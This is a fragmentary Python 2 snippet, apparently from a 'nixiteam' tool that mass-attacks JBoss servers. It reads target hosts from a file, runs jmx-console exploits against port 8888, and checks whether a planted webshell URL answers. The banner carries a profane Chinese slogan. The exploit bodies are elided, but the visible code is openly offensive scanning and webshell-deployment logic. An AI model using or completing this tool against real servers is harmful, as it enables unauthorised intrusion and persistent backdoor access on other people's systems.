...
def get_successfully(url, path):
    ...
    result = r.status
    if result == 200:
            _exploits.writresult(url + path)
        
    if result == 404:
        sleep(7)
        r = pool.request('GET', url + path, redirect=False, headers=headers)
        result = r.status
    print "webshell url：" + url + path + "   HttpCode :" + str(result)
    return result
...
def auto_exploit(url, exploit_type):
    ...
    if exploit_type == "jmx-console":
        ...
        print "使用了exploit_admin_console(url) 攻击！"
...
def banner():
    ...
    """
    clear()
    print(RED1 + "nixiteam 自动化打她妈的jboss")

def main():
        file_object = open('jboss.txt')
        for line in file_object:
            maina("http://" + str(line).strip() + ":8888/")
